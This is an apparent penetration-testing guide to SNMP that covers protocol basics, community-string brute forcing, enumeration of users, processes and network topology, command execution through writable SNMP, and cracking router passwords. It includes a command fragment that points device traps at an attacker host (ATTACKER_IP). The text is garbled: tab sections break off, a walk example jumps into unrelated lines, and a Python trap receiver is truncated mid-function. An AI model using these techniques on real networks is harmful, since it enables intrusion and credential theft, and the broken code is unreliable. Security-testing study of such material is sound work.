## Overview

SNMP (Simple Network Management Protocol) is a UDP-based protocol used for monitoring and managing network devices such as routers, switches, firewalls, servers, printers, and IoT devices. It operates on **UDP port 161** (agent queries) and **UDP port 162** (traps/notifications). SNMP is one of the most valuable protocols during penetration tests because it frequently exposes **system configuration, credentials, network topology, running processes, installed software, ARP tables, routing tables, and user accounts** — often protected only by easily guessable community strings.

::card-group
  ::card
  ---
  title: Default Ports
  icon: i-lucide-network
  ---
  `161/UDP` (SNMP agent — queries), `162/UDP` (SNMP traps — notifications), `10161/UDP` (SNMP over DTLS), `10162/UDP` (SNMP traps over DTLS)
  ::

  ::card
  ---
  title: Protocol
  icon: i-lucide-cable
  ---
  UDP-based (connectionless). Three major versions: **SNMPv1** (community strings, no encryption), **SNMPv2c** (community strings, bulk operations), **SNMPv3** (username/password, encryption, integrity).
  ::

  ::card
  ---
  title: Authentication
  icon: i-lucide-lock
  ---
  **SNMPv1/v2c**: Community strings (plaintext shared secrets). Default `public` (read) and `private` (read-write). **SNMPv3**: Username + auth protocol (MD5/SHA) + privacy protocol (DES/AES).
  ::

  ::card
  ---
  title: Tags
  icon: i-lucide-tags
  ---
  `network pentesting` · `snmp` · `udp` · `community string` · `information disclosure` · `credential harvesting` · `network recon` · `configuration extraction` · `rce via snmp write`
  ::

::note
SNMP data is organized in a tree structure called the **MIB (Management Information Base)**. Each piece of data has a unique **OID (Object Identifier)** — a dotted numerical address like `1.3.6.1.2.1.1.1.0` (sysDescr). Understanding key OIDs is essential for targeted extraction during pentests.
::

## SNMP Fundamentals

### Protocol Versions

::collapsible

| Version | Authentication | Encryption | Key Features |
| ------- | ------------- | ---------- | ------------ |
| **SNMPv1** | Community string (plaintext) | None | Original version, widely supported, no security |
| **SNMPv2c** | Community string (plaintext) | None | Bulk operations (`GETBULK`), improved error handling |
| **SNMPv3 noAuthNoPriv** | Username only | None | Username-based, no auth or encryption |
| **SNMPv3 authNoPriv** | Username + MD5/SHA | None | Authentication but no encryption |
| **SNMPv3 authPriv** | Username + MD5/SHA | DES/AES | Full authentication and encryption |

::

### Key SNMP Operations

::collapsible

| Operation | Direction | Description |
| --------- | --------- | ----------- |
| `GET` | Manager → Agent | Retrieve a specific OID value |
| `GETNEXT` | Manager → Agent | Retrieve next OID in tree (walking) |
| `GETBULK` | Manager → Agent | Retrieve multiple OIDs efficiently (v2c+) |
| `SET` | Manager → Agent | **Write/modify** a value on the device |
| `TRAP` | Agent → Manager | Unsolicited notification from device |
| `INFORM` | Agent → Manager | Acknowledged notification (v2c+) |
| `RESPONSE` | Agent → Manager | Reply to GET/SET requests |

::

### Community String Discovery

::warning
Community strings act as passwords in SNMPv1/v2c. The default `public` (read-only) and `private` (read-write) are used on a **staggering number of production devices**.
::

::tabs
  :::tabs-item{icon="i-lucide-key" label="onesixtyone"}

### Full SNMP Walk

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="snmpwalk"}

  # Full SNMP walk (entire MIB tree)

  snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1        # System

  1.3.6.1.6.3.12.1.3.1.4 a ATTACKER_IP

# - Link up/down events
# - Authentication failures (reveals valid users)
# - Configuration changes
# - Environmental alerts
# - Security events

# Python trap receiver
python3 << 'PYEOF'
from pysnmp.carrier.asyncore.dgram import udp
from pysnmp.entity import engine, config
from pysnmp.entity.rfc3413 import ntfrcv

snmpEngine = engine.SnmpEngine()
config.addTransport(snmpEngine, udp.domainName,
    udp.UdpTransport().openServerMode(('0.0.0.0', 162)))
config.addV1System(snmpEngine, 'public', 'public')

          varBinds, cbCtx):

    for name, val in varBinds:

## Pentest Checklist

::steps{level="4"}

#### Discover SNMP Services

Scan UDP port 161 across the target range using Nmap, Masscan, or onesixtyone. Remember SNMP is UDP — scans take longer and may require retries.

#### Test Default Community Strings

Test `public` (read) and `private` (read-write) immediately. These defaults are present on a surprisingly large number of production devices.

#### Brute Force Community Strings

Use onesixtyone, Hydra, or Nmap brute scripts with comprehensive community string wordlists from SecLists.

#### Test for Write Access

Attempt `snmpset` with discovered community strings. Write access to `private` or custom RW communities enables configuration manipulation and RCE.

#### Extract System Information

Query sysDescr, sysName, sysContact, sysLocation, sysUpTime to identify OS, hostname, hardware, and admin details.

#### Enumerate Network Topology

Extract interfaces, IP addresses, subnet masks, routing tables, ARP tables, and CDP/LLDP neighbors to map the internal network.

#### Enumerate Users and Shares (Windows)

Walk Windows-specific OIDs for user accounts, network shares, domain name, and services. Use extracted usernames for credential attacks.

#### Enumerate Processes and Software

Extract running process names, paths, and command-line parameters. Search parameters for embedded credentials.

#### Extract Active Network Connections

Walk TCP connection and UDP listener tables to discover services, internal communications, and potential pivot targets.

#### Check net-snmp Extend Scripts

Query the NET-SNMP-EXTEND-MIB for configured extend scripts. These may leak sensitive data or enable command execution.

#### Attempt RCE via SNMP Write

If write access exists, use net-snmp extend to execute arbitrary commands, or download Cisco configs via TFTP.

#### Extract and Crack Device Credentials

Download router/switch configurations and crack embedded passwords (Cisco Type 5/7/8/9, SNMP community strings used as passwords).

#### Test SNMPv3 Usernames and Credentials

Enumerate SNMPv3 usernames via timing differences. Brute force auth/priv passwords for SNMPv3 accounts.

#### Document All Findings

Record evidence of default communities, write access, credential exposure, network topology disclosure, RCE, and provide remediation recommendations.
